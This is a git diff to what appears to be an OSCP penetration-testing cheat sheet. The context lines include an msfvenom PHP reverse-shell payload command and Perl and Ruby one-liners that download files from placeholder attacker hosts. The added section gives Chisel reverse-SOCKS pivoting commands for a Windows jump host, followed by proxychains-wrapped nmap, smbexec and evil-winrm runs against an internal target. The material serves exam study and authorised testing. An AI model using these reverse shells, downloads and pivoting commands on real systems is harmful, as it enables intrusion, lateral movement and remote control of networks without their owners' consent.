@@ -391,3 +391,36 @@ msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
 | perl -e ‘use LWP::Simple; getstore(“http://IP_ADDR/file”, “out_file”)’	| Library for WWW in Perl |
 | ruby -e ‘require “open-uri”;File.open(“output_file”, “wb”) do \|file\|;URI.open(“http://ip-addr:port/file”).read;end’	| Ruby Open-URI library |
 | echo -n “base64-output” > file	| Decoding the base64 output of the file |
+
+## Pivoting for lateral movement
+### https://blog.mkiesel.ch/posts/oscp_pivoting/
+#### Using Chisel
+
+```bash
+#On your attacking machine (192.168.60.200) setup a Chisel server with:
+#PORT = port for the Chisel traffic
+#socks5 = to setup a SOCKS5 proxy
+#reverse = to tell Chisel to wait for a connection from a client![image](https://github.com/redcountryroad/OSCP-shortsheet/assets/166571565/a7790501-9a7e-42d5-a7ee-a53a3760d695)
+chisel server --port 1080 --sock5 --reverse
+
+#On your attacking machine edit the file /etc/proxychains4.conf #1080 is the sock5 port
+#Chisel
+#1080 is the default port of the Chisel reverse proxy
+socks5 127.0.0.1 1080
+
+#on windows jumphost, setup Chisel Client with:
+#IP = The IP address of your Chisel server
+#PORT = The port you set on your Chisel sever
+#R:socks = enables the reverse SOCKS proxy
+#max-retry-count 1 = to exit Chisel when you kill your server
+.\Chisel.exe client --max-retry-count 1 192.168.60.200:1080 --sock5 --reverse![image](https://github.com/redcountryroad/OSCP-shortsheet/assets/166571565/835958fd-df20-4b71-9cb9-f605e2a35f8f)
+
+#You can now attack the third server (ex. 10.0.60.99) by adding proxychains -q before every command. The -q is for quiet mode since most attackers won’t need verbose proxy traffic
+#The traffic flows into port 1080 on your machine and out on your jump host, which has established a connection back to your listener on the port you specified when executing chisel server
+proxychains -q nmap -sC -sV 10.0.60.99
+proxychains -q ssh user@10.0.60.99
+proxychains -q mysql -u dbuser -h 10.0.60.99
+proxychains -q impacket-smbexec domain\user:password -target-ip  10.0.60.99
+proxychains -q evil-winrm -i 10.0.60.99 -u 'domain\user' -p 'password'
+
+```
